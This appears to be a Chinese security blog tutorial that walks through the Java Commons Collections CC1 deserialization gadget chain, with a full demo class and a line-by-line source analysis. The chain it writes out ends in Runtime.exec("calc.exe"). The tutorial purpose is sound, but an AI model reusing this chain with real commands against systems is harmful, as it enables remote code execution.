---
layout: post
title: "Java CC1 链底层原理分析与利用 Demo"
date: 2026-11-12 12:00:00 +0800
categories: [Java安全, 反序列化]
tags: [CC1, JVM, 反射]
---
> **⚠️ 免责声明（Disclaimer）**
>
> 本文及相关的代码（PoC/EXP）仅供**网络安全教育、防御技术研究及授权测试**使用。
> **严禁**将本文所提供的技术或代码用于任何未经授权的非法攻击、破坏或牟利行为。
> 任何个人或组织在使用本技术时，必须确保其行为符合当地法律法规，并在获得目标系统所有者明确授权的前提下进行。
> 使用者因滥用本技术所产生的一切直接或间接后果，均由使用者本人承担，本文作者不承担任何连带法律责任。
>
> The code and techniques provided in this article are strictly for **educational and authorized penetration testing purposes only**.
> You are solely responsible for ensuring that your use of this information complies with applicable laws. The author assumes no liability for any misuse or damage caused by this program.

```Java

// 这是一个CC1的demo
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC1 {
    public static void main(String[] args) throws Exception {
        String command = "calc.exe";

        // 1. 假数组，为了在 put 的时候不提前触发漏洞
        Transformer[] fakeTransformers = new Transformer[]{
                new ConstantTransformer(1)
        };

        // 2. 真正的恶意执行链（通过反射执行命令）
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command})
        };

        // 3. 把假数组塞进 ChainedTransformer
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        // 4. 构建 LazyMap
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        // 5. 构建 TiedMapEntry（触发点是它的 hashCode 方法）
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "wtj");

        // 6. 构建触发大本营 HashMap
        Map expMap = new HashMap();
        expMap.put(tiedMapEntry, "value");
        outerMap.remove("wtj"); // 清空真实值，保证反序列化/触发时能调用到 get()

        // 7. 偷梁换柱：用反射把假数组替换成真正的恶意数组
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        // 8. 触发（模拟反序列化时的 put 或者 readObject）
        expMap.put(tiedMapEntry, "trigger");
    }
}
```

上面是一个比较简单的CC1利用链的demo，非常的优雅，为什么说优雅呢因为等你看完之后你也会觉得很优雅，好了笔者基本是想到啥说啥，接下来我们开始分析这个demo。

```Java

        Transformer[] fakeTransformers = new Transformer[]{  
                new ConstantTransformer(1)
        };

//上面是定义了一个 Transformer类型的数组 instance，算是集合吧，里面传入了一个ConstantTransformer instance  放进了这个数组instance里面，
// 他的作用是什么呢就是狸猫换太子里面的太子，当然先不用管他是干啥的，我们直接看源码
 private final Object iConstant;

 public ConstantTransformer(Object constantToReturn) {
        super();
        iConstant = constantToReturn;
    }
    public Object transform(Object input) {
        return iConstant;
    }
// 扇面是一个他的构造方法，和他的一个transform方法，意思是我们new ConstantTransformer(1)，就会将1传入到他的iConstant变量里，当我们需要这个1的时候
// 就可以执行transform method , 将 1 return出来。
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command})
        };
// 接下来我们分析这个填装恶意代码的环节，其实和刚才不同的就是多了new InvokerTransformer，我们也可以去看一下他的源码，无尽的扒源码之路哈哈

    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }
	    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
            
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }

//上面就是 InvokerTransformer class 的构造方法和他的 transform method 了这里是核心代码，我们后面会用到。
	Transformer transformerChain = new ChainedTransformer(fakeTransformers);
//这里我们可以看到又搞了一个什么ChainedTransformer instance ，之后把我们的fakeTransformers instance 传到了里面我们去扒一下源码
    public ChainedTransformer(Transformer[] transformers) {
        super();
        iTransformers = transformers;
    }

    public Object transform(Object object) {
        for (int i = 0; i < iTransformers.length; i++) {
            object = iTransformers[i].transform(object);
        }
        return object;
    }
//上面就是他的构造方法和transform method ， 我们可以看到他执行transform method,会把他ChainedTransformer instance 里面存储的Transformer[] 
// instance 也就是我们存入的fakeTransformers ，里面的 new ConstantTransformer(1) 匿名instance找出来然后执行他的 transform method

      Map innerMap = new HashMap();
      Map outerMap = LazyMap.decorate(innerMap, transformerChain);
//之后我们来分析上面的两行代码，第一行其实就是定义了一个 HashMap instance 放到了 heap里面
// 第二行通过LazyMap的static method 来返回一个 LazyMap instance 放进 heap, 我们来扒一下源码
    public static Map decorate(Map map, Transformer factory) {
        return new LazyMap(map, factory);
    }
	    public Object get(Object key) {
        // create value for key if key is not currently in the map
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
// 他这里重点是有一个get method 我们后续需要用到，我们可以看到他的static method 是传入我们上面创建的 HashMap instance 以及transformerChain instance
// 当他执行get method 的时候回去调用 HashMap instance.containsKey 判断我们传入的key是存在 ， 但是我们创建的HashMap 是一个空的，所以不会存在key，这个时候
// 他就会调用我们传入的transformerChain instance.transform method ,这个 transformerChain.instance 就会对他存储的 Array[] 进行便利，并返回value
// 这个时候由于我们传入了一个new ConstantTransformer(1) 他会便利出 1 然后 return 1 , 之后不断返回 ， 最后执行 map.put(key,1)的结果

TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "wtj");
// 这里是 create a TiedMapEntry instance , 并将我们的 outerMap 和 "wtj" 传入构造方法，源码如下

    public TiedMapEntry(Map map, Object key) {
        super();
        this.map = map;
        this.key = key;
    }
	  public int hashCode() {
        Object value = getValue();
        return (getKey() == null ? 0 : getKey().hashCode()) ^
               (value == null ? 0 : value.hashCode()); 
    }
	    public Object getValue() {
        return map.get(key);
    }

//上面就是他的一些我们在CC1中用到的一些method了，后续我们会用到.
	    Map expMap = new HashMap();
        expMap.put(tiedMapEntry, "value");
        outerMap.remove("wtj"); 
//哎呀刚说完会用到就要用到了，他这里创建了一个新的 HashMap instance ,然后触发关键点expMap.put(tiedMapEntry, "value");，我们来扒一下源码
	public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }
	    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
// 这里就是 expMap.put(tiedMapEntry, "value"); -> hash(tiedMapEntry) ->   tiedMapEntry.getValue() -> tiedMapEntry.map.get("wtj")
// 然后就是上面的逻辑赋值为 ("wtj",1) 了，之后我们通过outerMap.remove("wtj");  清除一下 key
	    Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);
// 这里就到了我们上面说的狸猫换太子了，相信读者已经块忘了吧，这里也是为数不多的通过反射机制去实现的步骤
// 这里这里直接去获取了 ChainedTransformer.class 的 getDeclaredField字段，然后通过f.setAccessible(true); 让我们强行有通过 class instance
// 来控制所有 ChainedTransformer instance的能力，然后我们将transformerChain的iTransformers field ，强行改成我们的transformers，实现狸猫换太子
		expMap.put(tiedMapEntry, "trigger");
// 然后通过我们上面描述的触发机制去执行而已指令，当然到这里还远远没有结束，我们将进入最核心也就比较绕的代码去分析，他是怎么弹出 calc 的，我们再开一个代码块
```

```Java
		Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command})
        };

    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }
	    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
            
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }

// 我们这里到了需要动脑子的环节了，相信各位大牛看这个也是简简单单
// 我们通过构造利用链条，到了最后一步触发环节，接下来我们开始分析一下这最关键的一步是怎么实现的
// 由于前面分析过如果触发的了，我们直接跳到 循环执行 transform 的环节,下面为伪代码

1. new ConstantTransformer(Runtime.class).transform("trigger")
  
	   public Object transform(Object input) {
        return iConstant;
    }
//这里直接把 "trigger" 扔掉执行transform method ， 返回的value 为 Runtime.class
2. new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}).transform(Runtime.class)
  	        try {
            Class cls = Runtime.class.getClass(); //这里获取了 Class instance
            Method method = cls.getMethod("getMethod", new Class[]{String.class, Class[].class});
  	// 这里是获取了 class 类的 getMethod(String , class[]) , 并将其创建为了一个 Method instance , 这个 Method instance 里存储着 Method's InstanceKlass
  	// 以及 方法名 "getMethod"
            return method.invoke(input, iArgs);
   // 这里通过 invoke method , 调用了 Runtime.class  -> Runtime's InstanceKlass -> _method["getRuntime"] ,这里返回了一个 Method instance 
   // 里面存的内容为 getMethod 方法名 and 指向Runtime's InstanceKlass 的指针
             
        }
3. new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}).transform(Method)
	// 这里就是拿到了第二层的返回值作为 transform method 的传入值
  		try {
            Class cls = Method instance.getClass();  //这里获取了 Method.class
            Method method = cls.getMethod("invoke", new Class[]{Object.class, Object[].class}); // 这里就是获取 Method  class的 invoke method
            return method.invoke(Method instance,new Object[]{null, new Object[0]}) ); // 这里就是最后就是执行了 Runtime.getRuntime() ,然后返回了一个Runtime instance
        } 

4.  new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command}).transform(Runtime instance)
  		try {
            Class cls = Runtime instance .getClass(); // 获取 Runtime.class
            Method method = cls.getMethod("exec", new Class[]{String.class}); // 获取 exec(String) method
            return method.invoke(Runtime instance, new Object[]{command}); //执行 Runtime instance.exec("calc.exe")
            
        }
  
```
